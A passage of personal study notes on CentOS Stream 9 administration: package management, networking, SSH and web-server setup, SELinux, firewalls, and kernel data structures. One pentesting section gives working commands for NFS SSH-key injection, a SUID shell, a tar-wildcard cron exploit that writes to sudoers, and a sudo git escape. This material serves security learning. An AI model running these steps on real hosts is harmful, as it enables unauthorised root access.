		  sudo chage -d 0 deployer
		  
		  # Set maximum password validity period to 90 days
		  sudo chage -M 90 deployer
		  
		  # Set warning timeline alert to 7 days before password expires
		  sudo chage -W 7 deployer
		  ```
-
- # Package Management
  collapsed:: true
	- ## The YUM to DNF Transition
		- Historically, CentOS versions 5, 6, and 7 utilized the **YUM** (Yellowdog Updater, Modified) package manager.
		- In CentOS 8, YUM was replaced by **DNF** (Dandified YUM), which is also the default package manager for CentOS Stream 9.
		- Key differences:
			- DNF utilizes libsolv for modern dependency resolution algorithms.
			- DNF handles package transactions with a smaller memory footprint and faster repository metadata parsing.
			- DNF supports modularity streams (AppStream) allowing parallel versions of development stacks to coexist.
			- On CentOS Stream 9, `/usr/bin/yum` is simply a symbolic link pointing to `/usr/bin/dnf`.
	- ## Common DNF Package Management Commands
		- ```bash
		  # Search for a package by keyword
		  dnf search redis
		  
		  # View details about a package
		  dnf info redis
		  
		  # Install a package from enabled repositories
		  sudo dnf install redis -y
		  
		  # Install a local RPM package file, resolving dependencies from remote repos automatically
		  sudo dnf localinstall ./custom-agent.rpm -y
		  
		  # Remove a package
		  sudo dnf remove redis -y
		  
		  # Remove package and clean out orphaned dependencies
		  sudo dnf autoremove -y
		  
		  # Clean the package download database cache and metadata files
		  sudo dnf clean all
		  
		  # Check for updates without performing installation
		  dnf check-update
		  
		  # Update all installed packages to their latest versions
		  sudo dnf upgrade -y
		  ```
		- ### Transaction History
			- DNF tracks all installation transactions in a historical database, allowing rollbacks:
			- ```bash
			  # Display DNF transaction history
			  dnf history
			  
			  # View details of a specific transaction ID
			  dnf history info 12
			  
			  # Undo the actions of transaction ID 12 (removes installed packages, restores removed ones)
			  sudo dnf history undo 12
			  ```
	- ## Modularity (AppStream Modules)
		- AppStream modules allow CentOS to serve multiple versions of languages or databases (e.g., Node.js 18, 20, 22) without requiring third-party repositories.
		- ```bash
		  # List all available modules and streams
		  dnf module list
		  
		  # List streams specific to python
		  dnf module list python
		  
		  # Enable a specific stream (e.g., nodejs version 20)
		  sudo dnf module enable nodejs:20 -y
		  
		  # Install the default profile of the enabled stream
		  sudo dnf module install nodejs -y
		  
		  # Switch to a different stream (requires module reset)
		  sudo dnf module reset nodejs -y
		  sudo dnf module enable nodejs:22 -y
		  sudo dnf module install nodejs -y
		  ```
	- ## Creating a Custom Local RPM Repository
		- Administrators can build private software archives and distribute them internally.
		- ```bash
		  # 1. Install creative utilities
		  sudo dnf install createrepo -y
		  
		  # 2. Create target directory and place RPM files inside
		  sudo mkdir -p /var/www/html/repos/enterprise/
		  sudo cp /tmp/custom-app.rpm /var/www/html/repos/enterprise/
		  
		  # 3. Generate repository metadata xml structures
		  sudo createrepo /var/www/html/repos/enterprise/
		  
		  # 4. Write a custom repository config file in /etc/yum.repos.d/
		  sudo tee /etc/yum.repos.d/enterprise.repo << 'EOF'
		  [enterprise]
		  name=Enterprise Custom Repository
		  baseurl=file:///var/www/html/repos/enterprise/
		  enabled=1
		  gpgcheck=0
		  EOF
		  
		  # Update package manager lists
		  dnf makecache
		  ```
	- ## Enabling EPEL & CRB Repositories
		- **EPEL** (Extra Packages for Enterprise Linux) is a community repository maintained by the Fedora Project that provides thousands of high-quality software packages (e.g., htop, fail2ban) that are not included in the default CentOS repositories.
		- The **CRB** (CodeReady Builder) repository contains development headers and build utilities needed by many EPEL packages.
		- ```bash
		  # 1. Enable the CRB repository
		  sudo dnf config-manager --set-enabled crb
		  
		  # 2. Install the EPEL repository configuration package
		  sudo dnf install epel-release -y
		  
		  # 3. Clean and rebuild caches
		  sudo dnf clean all && dnf makecache
		  ```
	- ## Low-level RPM Commands
		- When DNF is not needed for dependency resolution, use the `rpm` utility directly:
		- ```bash
		  # Query all installed RPM packages
		  rpm -qa
		  
		  # Find which package owns a specific file
		  rpm -qf /etc/nginx/nginx.conf
		  
		  # List all files installed by a specific package
		  rpm -ql nginx
		  
		  # Install a raw RPM package file (verbose, showing progress hashes)
		  sudo rpm -ivh agent.rpm
		  
		  # Verify the integrity of a package's files (checks MD5, size, permissions against database)
		  rpm -V nginx
		  ```
-
- # Networking
  collapsed:: true
	- ## Networking Commands
		- Modern CentOS installations use iproute2 utilities.
		- ```bash
		  # View IP configurations
		  ip addr show
		  
		  # View active routing tables
		  ip route show
		  
		  # Expose listening ports and protocol details
		  ss -tulnp
		  
		  # Perform a DNS lookup
		  dig enterprise.local
		  
		  # Retrieve HTTP headers from server
		  curl -I https://www.centos.org
		  ```
	- ## NetworkManager & nmcli
		- CentOS manages network interfaces using **NetworkManager**.
		- Use the `nmcli` CLI utility or the terminal GUI `nmtui` to modify configurations.
		- ```bash
		  # List active connections
		  nmcli connection show
		  
		  # Add a static IP configuration to interface 'eth0'
		  sudo nmcli connection add con-name static-eth0 ifname eth0 type ethernet ip4 192.168.1.50/24 gw4 192.168.1.1
		  
		  # Set DNS servers for static-eth0
		  sudo nmcli connection modify static-eth0 ipv4.dns "8.8.8.8 8.8.4.4"
		  
		  # Set method to manual (static)
		  sudo nmcli connection modify static-eth0 ipv4.method manual
		  
		  # Bring the connection up
		  sudo nmcli connection up static-eth0
		  ```
	- ## Keyfile Connection Profiles vs Legacy ifcfg Files
		- Historically, configurations were stored in `/etc/sysconfig/network-scripts/ifcfg-<interface>`.
		- In CentOS Stream 9, NetworkManager uses the standardized INI-style **Keyfile** connection profiles located under `/etc/NetworkManager/system-connections/`:
		- ```ini
		  # Example: /etc/NetworkManager/system-connections/eth0.nmconnection
		  [connection]
		  id=eth0
		  uuid=e82a5c92-d6cf-4b10-8fa3-ebad75fffa6b
		  type=ethernet
		  interface-name=eth0
		  
		  [ethernet]
		  
		  [ipv4]
		  address1=192.168.1.50/24,192.168.1.1
		  dns=8.8.8.8;8.8.4.4;
		  method=manual
		  
		  [ipv6]
		  addr-gen-mode=default
		  method=auto
		  ```
		- Permissions on these configurations must be strict: `chmod 600 /etc/NetworkManager/system-connections/*.nmconnection`.
	- ## SSH Server Hardening
		- Secure the OpenSSH daemon by editing `/etc/ssh/sshd_config`:
		- ```bash
		  # Edit Configuration File
		  sudo vim /etc/ssh/sshd_config
		  
		  # Recommended Hardening Parameters:
		  # Port 2222                 # Change default port to evade automated scans
		  # PermitRootLogin no        # Prevent direct root login (force sudo use)
		  # MaxAuthTries 3            # Drop connection after 3 failed password attempts
		  # PasswordAuthentication no  # Enforce SSH key-based authentication only
		  # X11Forwarding no          # Disable GUI forwarding to reduce attack surface
		  # ClientAliveInterval 300   # Terminate inactive sessions after 5 minutes of idle time
		  # ClientAliveCountMax 2
		  
		  # Restart SSH Service to apply changes
		  sudo systemctl restart sshd
		  ```
	- ## SSH Tunneling Configurations
		- ### Local Port Forwarding
			- Forward connections from local port 8080 to remote server's port 3306 (MySQL):
			- ```bash
			  ssh -L 8080:127.0.0.1:3306 sysadmin@dbserver01.enterprise.local
			  ```
		- ### Remote Port Forwarding
			- Expose local port 80 to port 9090 on a public server:
			- ```bash
			  ssh -R 9090:127.0.0.1:80 sysadmin@publicgateway.local
			  ```
		- ### Dynamic SOCKS Proxy
			- Establish a local SOCKS5 proxy on port 1080 to route all traffic securely through a remote server:
			- ```bash
			  ssh -D 1080 sysadmin@jumpbox.enterprise.local
			  ```
-
- # Enterprise Server Administration & Services
  collapsed:: true
	- ## LAMP Stack Deployment
		- Apache, MariaDB, and PHP-FPM represent the classical enterprise architecture deployment.
		- ```bash
		  # 1. Install packages
		  sudo dnf install httpd mariadb-server php php-fpm php-mysqlnd -y
		  
		  # 2. Configure services to start on boot
		  sudo systemctl enable --now httpd mariadb php-fpm
		  
		  # 3. Configure local database security parameters
		  sudo mysql_secure_installation
		  
		  # 4. Open Apache ports on the firewall
		  sudo firewall-cmd --permanent --add-service=http
		  sudo firewall-cmd --permanent --add-service=https
		  sudo firewall-cmd --reload
		  ```
	- ## LEMP Stack Deployment
		- Nginx combined with PHP-FPM offers a high-performance alternative to Apache.
		- ```bash
		  # 1. Install Nginx, MariaDB, PHP-FPM
		  sudo dnf install nginx mariadb-server php-fpm php-mysqlnd -y
		  
		  # 2. Start services
		  sudo systemctl enable --now nginx mariadb php-fpm
		  
		  # 3. Edit PHP-FPM configuration to use Unix socket and match owner
		  # File: /etc/php-fpm.d/www.conf
		  # Modify parameters:
		  # listen = /run/php-fpm/www.sock
		  # listen.owner = nginx
		  # listen.group = nginx
		  # listen.mode = 0660
		  # user = nginx
		  # group = nginx
		  
		  # Restart services
		  sudo systemctl restart php-fpm nginx
		  ```
	- ## Nginx Reverse Proxy with SSL Termination
		- Write Nginx configurations under `/etc/nginx/conf.d/`:
		- ```nginx
		  # File: /etc/nginx/conf.d/proxy.conf
		  upstream backend_app {
		      server 10.0.0.25:8080; # Target internal application server
		      keepalive 32;
		  }
		  
		  server {
		      listen 80;
		      server_name app.enterprise.local;
		      return 301 https://$host$request_uri; # Redirect HTTP to HTTPS
		  }
		  
		  server {
		      listen 443 ssl http2;
		      server_name app.enterprise.local;
		      
		      # SSL certificates
		      ssl_certificate /etc/pki/tls/certs/app_cert.crt;
		      ssl_certificate_key /etc/pki/tls/private/app_key.key;
		      
		      # Harden TLS parameters
		      ssl_protocols TLSv1.2 TLSv1.3;
		      ssl_ciphers HIGH:!aNULL:!MD5;
		      ssl_prefer_server_ciphers on;
		      
		      location / {
		          proxy_pass http://backend_app;
		          proxy_http_version 1.1;
		          
		          # Pass client headers to backend
		          proxy_set_header Connection "";
		          proxy_set_header Host $host;
		          proxy_set_header X-Real-IP $remote_addr;
		          proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
		          proxy_set_header X-Forwarded-Proto $scheme;
		      }
		  }
		  ```
	- ## Varnish Cache Acceleration
		- Install Varnish to cache HTTP assets and accelerate web serving speeds.
		- ```bash
		  # Install Varnish
		  sudo dnf install varnish -y
		  
		  # Configure Varnish Backend mapping
		  # File: /etc/varnish/default.vcl
		  # backend default {
		  #     .host = "127.0.0.1";
		  #     .port = "8080";
		  # }
		  
		  # Start Varnish on port 80 (modify systemd service parameters)
		  sudo systemctl enable --now varnish
		  ```
	- ## Creating a Custom Systemd Unit File
		- To run a custom program as a system daemon, write a custom systemd unit file.
		- ```ini
		  # File: /etc/systemd/system/enterprise-app.service
		  [Unit]
		  Description=Enterprise Java Daemon API
		  After=network.target mariadb.service
		  
		  [Service]
		  Type=simple
		  User=deployer
		  WorkingDirectory=/opt/enterprise-app/
		  ExecStart=/usr/bin/java -jar /opt/enterprise-app/bin/app.jar
		  Restart=on-failure
		  RestartSec=10s
		  
		  # Security Sandboxing Hardening Parameters
		  PrivateTmp=yes
		  ProtectSystem=full
		  ProtectHome=yes
		  NoNewPrivileges=yes
		  
		  [Install]
		  WantedBy=multi-user.target
		  ```
		- ```bash
		  # Load the new service unit
		  sudo systemctl daemon-reload
		  
		  # Start and enable the service
		  sudo systemctl enable --now enterprise-app.service
		  
		  # Inspect systemd logs for the service
		  sudo journalctl -u enterprise-app.service -n 50 --no-pager
		  ```
	- ## Logrotate Custom Rules
		- CentOS uses logrotate to manage logs and prevent disks from filling up.
		- ```bash
		  # Example configuration file: /etc/logrotate.d/custom-app
		  /var/log/enterprise-app/*.log {
		      daily
		      rotate 14
		      compress
		      delaycompress
		      missingok
		      notifempty
		      create 0640 deployer wheel
		      sharedscripts
		      postrotate
		          /usr/bin/systemctl reload enterprise-app.service > /dev/null 2>&1 || true
		      endscript
		  }
		  ```
	- ## Network Storage Configuration (NFS & Samba)
		- ### NFS Server Configuration
			- ```bash
			  # 1. Install NFS utilities
			  sudo dnf install nfs-utils -y
			  
			  # 2. Create the directory to export
			  sudo mkdir -p /mnt/shared-nfs
			  sudo chown nobody:nobody /mnt/shared-nfs
			  
			  # 3. Export the share in /etc/exports
			  # Format: export_directory target_client(options)
			  echo "/mnt/shared-nfs 192.168.1.0/24(rw,sync,no_subtree_check)" | sudo tee -a /etc/exports
			  
			  # 4. Start NFS server services
			  sudo systemctl enable --now nfs-server
			  
			  # 5. Open NFS services in firewalld
			  sudo firewall-cmd --permanent --add-service=nfs
			  sudo firewall-cmd --reload
			  ```
		- ### NFS Client Mounting
			- ```bash
			  # Mount the remote NFS share locally
			  sudo mount -t nfs 192.168.1.10:/mnt/shared-nfs /mnt/local-nfs/
			  ```
		- ### Samba Shared Directory
			- ```bash
			  # 1. Install Samba packages
			  sudo dnf install samba samba-client -y
			  
			  # 2. Add config blocks in /etc/samba/smb.conf
			  # [corporate-share]
			  # path = /var/shared-smb
			  # writable = yes
			  # browseable = yes
			  # guest ok = no
			  
			  # 3. Create Samba user password (user must already exist in system)
			  sudo smbpasswd -a deployer
			  
			  # 4. Start Samba services
			  sudo systemctl enable --now smb
			  ```
-
- # Security Hardening & Ethical Hacking
  collapsed:: true
	- ## SELinux Deep Dive
		- Security-Enhanced Linux (SELinux) is a kernel module that implements Mandatory Access Control (MAC) based on the principle of least privilege. Unlike DAC (Discretionary Access Control), which checks user permissions, SELinux policies check process (subject) access to files (objects) based on security labels.
		- SELinux operates in one of three modes:
			- **Enforcing**: Policy is active, access is denied if violations occur, and violations are logged.
			- **Permissive**: Policy is active, violations are not blocked, but violations are logged (useful for troubleshooting).
			- **Disabled**: SELinux is completely inactive in the kernel.
		- ```bash
		  # Check current SELinux status
		  getenforce
		  
		  # Temporarily set mode to permissive
		  sudo setenforce 0
		  
		  # Temporarily set mode to enforcing
		  sudo setenforce 1
		  
		  # Permanently configure mode in /etc/selinux/config
		  # Modify: SELINUX=enforcing
		  ```
		- ### SELinux Contexts
			- Context format: `User:Role:Type:Level` (e.g., `unconfined_u:object_r:httpd_sys_content_t:s0`).
			- The **Type** is the most critical element for standard administration policies (referred to as type enforcement).
			- ```bash
			  # View files with security contexts
			  ls -Z /var/www/html/index.php
			  # Output: -rw-r--r--. root root unconfined_u:object_r:httpd_sys_content_t:s0 /var/www/html/index.php
			  
			  # View running processes with security contexts
			  ps -eZ | grep nginx
			  
			  # Modify context type permanently (e.g., changing port to serve web resources)
			  sudo semanage fcontext -a -t httpd_sys_content_t "/custom-web(/.*)?"
			  
			  # Apply the modified policy context to the filesystem path recursively
			  sudo restorecon -R -v /custom-web/
			  ```
		- ### SELinux Booleans
			- Booleans act as on/off switches within SELinux rules to change policy behaviors without recompiling policy source code.
			- ```bash
			  # List all available booleans
			  getsebool -a
			  
			  # Search for Apache-specific booleans
			  getsebool -a | grep httpd
			  
			  # Allow Nginx/Apache to establish network database connections (persistent across boots)
			  sudo setsebool -P httpd_can_network_connect_db 1
			  ```
		- ### Troubleshooting and Auditing SELinux
			- SELinux logs policy denials to `/var/log/audit/audit.log`. Denials are represented by `type=AVC`.
			- ```bash
			  # Search for SELinux denials in the audit log
			  sudo ausearch -m AVC -ts recent
			  
			  # Use audit2allow to review a denial and display the policy rule needed to resolve it
			  sudo grep "nginx" /var/log/audit/audit.log | audit2allow -m nginx_custom
			  
			  # Generate and apply a custom policy module to resolve a denial
			  sudo grep "nginx" /var/log/audit/audit.log | audit2allow -M nginx_custom
			  sudo semodule -i nginx_custom.pp
			  ```
		- ### Manual Creation of Custom SELinux Policy Modules
			- While `audit2allow` is standard, enterprise administrators must sometimes construct custom policies manually. This process requires writing a Type Enforcement (`.te`) source file, compiling it into a binary module (`.mod`), packaging it (`.pp`), and loading it into the running kernel.
			- ```bash
			  # 1. Install SELinux development packages
			  sudo dnf install -y checkpolicy
			  
			  # 2. Write the Type Enforcement source file: custom_port.te
			  # This module allows Nginx (httpd_t) to bind to a custom TCP port 9999 (labeled var_t by default)
			  cat << 'EOF' > custom_port.te
			  module custom_port 1.0;
			  
			  require {
			      type httpd_t;
			      type port_t;
			      class tcp_socket name_bind;
			  }
			  
			  # Allow rule: allow httpd_t to bind to TCP sockets in port_t
			  allow httpd_t port_t:tcp_socket name_bind;
			  EOF
			  
			  # 3. Compile the Type Enforcement source file into a binary module
			  checkmodule -M -m -o custom_port.mod custom_port.te
			  
			  # 4. Package the compiled module into a policy package (.pp)
			  semodule_package -o custom_port.pp -m custom_port.mod
			  
			  # 5. Load the custom policy package into the running kernel
			  sudo semodule -i custom_port.pp
			  
			  # 6. Verify that the custom module is loaded successfully
			  semodule -l | grep custom_port
			  ```
	- ## Firewalld Configuration
		- CentOS uses **firewalld** to manage network firewall rules.
		- Firewalld is zone-based; rules are applied to a network zone (default: `public`), which is then mapped to interfaces.
		- ```bash
		  # Check firewall status
		  sudo firewall-cmd --state
		  
		  # View active zones and interface mappings
		  sudo firewall-cmd --get-active-zones
		  
		  # List all rules in the public zone
		  sudo firewall-cmd --zone=public --list-all
		  
		  # Open HTTP and HTTPS services permanently
		  sudo firewall-cmd --permanent --add-service=http
		  sudo firewall-cmd --permanent --add-service=https
		  
		  # Open a specific port permanently (port 8080 TCP)
		  sudo firewall-cmd --permanent --add-port=8080/tcp
		  
		  # Reload firewall rules to apply changes
		  sudo firewall-cmd --reload
		  ```
		- ### Rich Rules
			- Rich rules allow for complex filtering, such as limiting access to specific IP addresses.
			- ```bash
			  # Only allow SSH connections from IP 192.168.1.100
			  sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.100" service name="ssh" accept'
			  
			  # Block network traffic from subnet 10.0.0.0/24 to port 80
			  sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.0.0/24" port port="80" protocol="tcp" reject'
			  
			  # Reload changes
			  sudo firewall-cmd --reload
			  ```
	- ## Fail2ban Intrusion Prevention
		- Fail2ban scans log files (e.g., SSH auth logs) and bans IPs that show signs of malicious activity (e.g., too many failed password attempts).
		- ```bash
		  # 1. Install Fail2ban from EPEL
		  sudo dnf install fail2ban -y
		  
		  # 2. Create a local jail configuration override
		  sudo tee /etc/fail2ban/jail.local << 'EOF'
		  [DEFAULT]
		  bantime = 1h
		  findtime = 10m
		  maxretry = 5
		  banaction = firewallcmd-ipset
		  
		  [sshd]
		  enabled = true
		  port = ssh
		  logpath = %(sshd_log)s
		  backend = %(sshd_backend)s
		  EOF
		  
		  # 3. Start Fail2ban service
		  sudo systemctl enable --now fail2ban
		  
		  # 4. Check status of sshd jail
		  sudo fail2ban-client status sshd
		  ```
	- ## AIDE Host-based Intrusion Detection System
		- **AIDE** (Advanced Intrusion Detection Environment) is a file and directory integrity checker. It builds a database of file properties (e.g., hashes, permissions, modification times) and flags modifications to alert administrators to potential intrusions.
		- ```bash
		  # 1. Install AIDE
		  sudo dnf install aide -y
		  
		  # 2. Initialize the file integrity database
		  sudo aide --init
		  
		  # 3. The initial database must be activated
		  sudo mv /var/lib/aide/aide.db.new.gz /var/lib/aide/aide.db.gz
		  
		  # 4. Perform an integrity check to scan for unauthorized file changes
		  sudo aide --check
		  ```
	- ## Ethical Hacking & Pentesting CentOS Servers
		- In security auditing and penetration testing scenarios (for broader methodology, see [[Cybersecurity]] and [[Ethical Hacking Advanced]]), security professionals assess CentOS targets using a structured framework:
			- ```
			  Reconnaissance (Nmap Scans) --> Service Enumeration --> Exploit Research --> Privilege Escalation
			  ```
		- ### 1. Reconnaissance
			- Run `nmap` scans against target IPs to map exposed services:
			- ```bash
			  # Run aggressive scan detecting services, OS fingerprint, and default vulnerability scripts
			  nmap -p- -A 192.168.1.15
			  
			  # Output might reveal open services:
			  # Port 22 (SSH) -> OpenSSH 8.7
			  # Port 80 (HTTP) -> Nginx 1.20
			  # Port 111 (RPC) -> rpcbind
			  # Port 2049 (NFS) -> Network File System
			  ```
		- ### 2. Exploiting NFS Share Misconfigurations
			- If port 2049 (NFS) is open, check what shares are exported:
			- ```bash
			  # List exports from the target server
			  showmount -e 192.168.1.15
			  # Output: Export list for 192.168.1.15: /var/shared-nfs (everyone)
			  
			  # Mount the remote share locally to inspect files
			  sudo mkdir -p /tmp/target-mount
			  sudo mount -t nfs 192.168.1.15:/var/shared-nfs /tmp/target-mount
			  
			  # If the share contains a user's home directory (e.g., /home/sysadmin):
			  # We can inject our public SSH key into their authorized_keys file
			  ssh-keygen -t ed25519 -f /tmp/attacker_key -N ""
			  cat /tmp/attacker_key.pub >> /tmp/target-mount/sysadmin/.ssh/authorized_keys
			  
			  # Connect via SSH as sysadmin without password authentication
			  ssh -i /tmp/attacker_key sysadmin@192.168.1.15
			  ```
		- ### 3. Local Privilege Escalation Vectors on CentOS
			- Once you have initial access as a low-privileged user (e.g., `sysadmin`), check for privilege escalation vectors to gain root:
			- **SUID Binary Misconfigurations**:
				- Inspect the system for executables with the SUID bit set:
				- ```bash
				  find / -perm -4000 -type f 2>/dev/null
				  ```
				- If a binary like `/usr/bin/find` has the SUID bit set, we can abuse it to execute commands as root (see GTFOBins):
				- ```bash
				  /usr/bin/find . -exec /bin/sh -p \; -quit
				  # Output: root shell prompt (#)
				  ```
			- **Cron Job Wildcard Exploitation**:
				- Check `/etc/crontab` for automated scripts running as root:
				- ```bash
				  cat /etc/crontab
				  # Output: */5 * * * * root tar -czf /backups/web.tar.gz /var/www/html/*
				  ```
				- If a cron job uses `tar` with a wildcard (`*`) inside a directory that is writable by our low-privileged user, we can exploit `tar`'s command execution flags:
				- ```bash
				  cd /var/www/html/
				  
				  # Create payload script to add sysadmin to sudoers with NOPASSWD
				  echo "echo 'sysadmin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" > payload.sh
				  chmod +x payload.sh
				  
				  # Inject tar options as filenames in the wildcard path
				  touch -- "--checkpoint=1"
				  touch -- "--checkpoint-action=exec=sh payload.sh"
				  
				  # When the cron job runs tar, the wildcard expands to pass the file names as arguments:
				  # tar -czf /backups/web.tar.gz --checkpoint=1 --checkpoint-action=exec=sh payload.sh
				  # This executes payload.sh as root.
				  ```
			- **Sudo Hijacking**:
				- Check what commands you are allowed to run with `sudo -l`:
				- ```bash
				  sudo -l
				  # Output: (root) NOPASSWD: /usr/bin/git
				  ```
				- Escape to a root shell from the `git` interactive pager:
				- ```bash
				  sudo git help config
				  # Enter "!/bin/sh" at the prompt to drop into a root shell
				  ```
-
- # DSA & System Design in Linux Kernels
  collapsed:: true
	- ## How the Kernel Implements Key Data Structures
		- Linux developers rely on classic data structures (detailed in [[DSA Algo & System Design]] and [[System Design]]) to manage memory, balance loads, route packets, and allocate system resources under extreme transaction volumes.
	- ## 1. Red-Black Trees (Self-balancing Binary Search Trees)
		- A Red-Black tree is a self-balancing binary search tree where nodes are labeled red or black, and balancing rules ensure that the longest path is no more than twice the length of the shortest path.
		- This structure guarantees $O(\log N)$ time complexity for search, insertion, and deletion operations.
		- In the Linux kernel, the Red-Black tree implementation is defined in `<linux/rbtree.h>`.
		- ### Completely Fair Scheduler (CFS)
			- The kernel's default process scheduler (CFS) uses a Red-Black tree to manage the scheduling queue of running tasks.
			- ```
			  CFS Scheduling Queue (Red-Black Tree):
			                      [Task C: vruntime=35] (Black)
			                             /        \
			        (Red) [Task A: vruntime=12]   [Task D: vruntime=42] (Red)
			                  \
			             [Task B: vruntime=20] (Black)
			             
			  * Leftmost node (Task A) has the lowest virtual runtime and is executed next.
			  ```
			- Task nodes are keyed by their virtual execution runtime (`vruntime`).
			- The task that has had the least CPU execution time (the leftmost node in the tree) is always chosen to run next.
			- The kernel caches the leftmost node pointer (`rb_leftmost`) to achieve $O(1)$ time complexity for retrieving the next task.
			- Inserting new tasks or updating task parameters occurs in $O(\log N)$ time, preventing scheduler thrashing even when thousands of processes are running.
		- ### Virtual Memory Area (VMA) Tracking
			- When a process maps memory (e.g., via `mmap`), the kernel creates a `vm_area_struct` object to represent the mapped memory range.
			- To quickly locate which VMA contains a specific memory address during page faults, the kernel stores a process's VMAs in a Red-Black tree.
			- This prevents search operations from stalling execution threads during page fault lookups.
	- ## 2. Radix Trees
		- A Radix tree (or trie) is a space-efficient tree data structure where nodes represent common prefixes of keys.
		- The kernel uses Radix trees to map long integer keys (such as file offset page numbers) to pointers (such as physical page descriptor structures in memory).
		- Defined in `<linux/radix-tree.h>`.
		- ### Page Cache
			- When the OS caches file pages in RAM, it needs to map file block offsets (e.g., page 512 of `database.db`) to the physical page descriptors (`struct page`).
			- A Radix tree provides $O(K)$ lookup operations (where $K$ is the key depth, which is constant and independent of the number of items stored in the tree), making page cache lookups extremely fast and caching-efficient.
	- ## 3. Doubly Linked Lists
		- The Linux kernel implements circular doubly linked lists in `<linux/list.h>` using the `list_head` structure.
		- Rather than wrapping data payloads inside node structures, the kernel embeds the `list_head` node directly *inside* the data structures themselves.
		- ```c
		  /* The kernel-native list node */
		  struct list_head {
		      struct list_head *next, *prev;
		  };
		  
		  /* Example data structure embedding the list node */
		  struct task_struct {
		      volatile long state;
		      pid_t pid;
		      struct list_head tasks; /* Embed list node to link all active tasks */
		  };
		  ```
		- ### Accessing the Data Structure: `container_of` Macro
			- Because the list structures only track pointers to other `list_head` fields, the kernel uses the `container_of` macro to calculate the starting memory address of the containing data structure.
			- ```c
			  #define container_of(ptr, type, member) ({                      \
			      const typeof( ((type *)0)->member ) *__mptr = (ptr);    \
			      (type *)( (char *)__mptr - offsetof(type,member) );})
			  ```
			- This design allows a single list implementation to link diverse data types, avoiding memory allocation overheads for wrapper nodes and reducing cache misses.
		- ### C Implementation of Kernel List Traversal
			- To understand how the kernel iterates over circular doubly linked lists, consider the following C implementation demonstrating list initialization, element insertion, and traversal using the `list_for_each` macro:
			- ```c
			  #include <stdio.h>
			  #include <stdlib.h>
			  #include <stddef.h>
			  
			  // Circular doubly linked list node
			  struct list_head {
			      struct list_head *next, *prev;
			  };
			  
			  // Inline initialization of list head
			  static inline void INIT_LIST_HEAD(struct list_head *list) {
			      list->next = list;
			      list->prev = list;
			  }
			  
			  // Internal helper to add a new node between two known consecutive nodes
			  static inline void __list_add(struct list_head *new_node,
			                                struct list_head *prev,
			                                struct list_head *next) {
			      next->prev = new_node;
			      new_node->next = next;
			      new_node->prev = prev;
			      prev->next = new_node;
			  }
			  
			  // Insert new node after the specified list head
			  static inline void list_add(struct list_head *new_node, struct list_head *head) {
			      __list_add(new_node, head, head->next);
			  }
			  
			  // Macro helper to iterate over a list
			  #define list_for_each(pos, head) \
			      for (pos = (head)->next; pos != (head); pos = pos->next)
			  
			  // Macro helper to retrieve parent struct pointer from member pointer
			  #define list_entry(ptr, type, member) \
			      ((type *)((char *)(ptr) - offsetof(type, member)))
			  
			  // User application data payload containing the list head
			  struct process_node {
			      int pid;
			      char name[32];
			      struct list_head list;
			  };
			  
			  int main() {
			      struct list_head process_list;
			      INIT_LIST_HEAD(&process_list);
			      
			      // Allocate and insert elements
			      struct process_node *p1 = malloc(sizeof(struct process_node));
			      p1->pid = 101;
			      list_add(&p1->list, &process_list);
			      
			      struct process_node *p2 = malloc(sizeof(struct process_node));
			      p2->pid = 202;
			      list_add(&p2->list, &process_list);
			      
			      // Traverse the list and retrieve structures
			      struct list_head *iter;
			      struct process_node *entry;
			      
			      printf("Traversing kernel-style linked list:\n");
			      list_for_each(iter, &process_list) {
			          entry = list_entry(iter, struct process_node, list);
			          printf("Found process node PID: %d\n", entry->pid);
			      }
			      
			      // Free memory (cleanup)
			      free(p1);
			      free(p2);
			      return 0;
			  }
			  ```
	- ## 4. Hash Tables
		- Hash tables map keys to values using a hashing function to compute bucket array indices, providing $O(1)$ average-case lookup performance.
		- Defined in `<linux/hashtable.h>`.
		- ### Directory Cache (dcache)
			- Resolving absolute paths to physical disk inodes is slow because it requires filesystem traversals.
			- The kernel uses a Directory Entry Cache (dentry) hash table to store path translations in memory.
			- Hashing pathnames allows directories to be located in $O(1)$ time, bypassing heavy disk operations.
		- ### Process ID (PID) Table
			- When system tools request process actions using integer PIDs, the kernel uses a hash table to locate the target `task_struct` objects in $O(1)$ time, avoiding linear search loops through the process table.
	- ## Performance Trade-offs in High-Performance System Designs
		- | Data Structure | Lookup | Insertion | Space Complexity | Kernel Use Cases | System Design Reason |
		  |----------------|--------|-----------|------------------|------------------|----------------------|
		  | **Red-Black Tree** | $O(\log N)$ | $O(\log N)$ | $O(N)$ | CFS Scheduler, VMA Tracking | Guarantees balanced search paths for dynamic range lookups. |
		  | **Radix Tree** | $O(1)$ (Constant $K$) | $O(1)$ (Constant $K$) | $O(N)$ | Page Cache, IDR Allocator | Fast, cache-friendly lookups for sparse integer key ranges. |
		  | **Doubly Linked List**| $O(N)$ | $O(1)$ | $O(N)$ | Task Lists, Network Queues | $O(1)$ insertion and deletion without requiring dynamic memory allocations. |
		  | **Hash Table** | $O(1)$ (Average) | $O(1)$ (Average) | $O(N)$ | dcache, PID Lookups | Fastest point lookups, but performance degrades under hash collisions. |
-
- # More Learn
	- ## Github & Webs
		- [Official CentOS Project Website](https://www.centos.org/) - Official downloads, documentation portals, and community news.
		- [CentOS Wiki Documentation](https://wiki.centos.org/) - Legacy and current wiki pages covering architecture, migration, and setups.
		- [RHEL 9 Administration Guide](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/9) - Red Hat's official enterprise documentation (100% applicable to CentOS).
		- [AlmaLinux Wiki](https://wiki.almalinux.org/) - Deep migration guides and package troubleshooting documentation.
		- [Rocky Linux Wiki](https://wiki.rockylinux.org/) - Comprehensive tutorials for enterprise services.
		- [GTFOBins](https://gtfobins.github.io/) - Curated list of Unix binaries that can be exploited to bypass local security restrictions.
	- ## Master Playlists YouTube
		- [CentOS Stream Tutorials - Official CentOS Channel](https://www.youtube.com/@CentOSProject) - Development workflows, SIG updates, and stream migration guides.
		- [Linux Server Administration Full Course - FreeCodeCamp](https://www.youtube.com/watch?v=wBp0Rb-68lY) - In-depth guide covering RHEL-family server configurations.
		- [Red Hat Enterprise Linux Training - Sander van Vugt](https://www.youtube.com/user/sandervanvugt) - Elite class preparation tutorials covering SELinux, firewalld, and storage.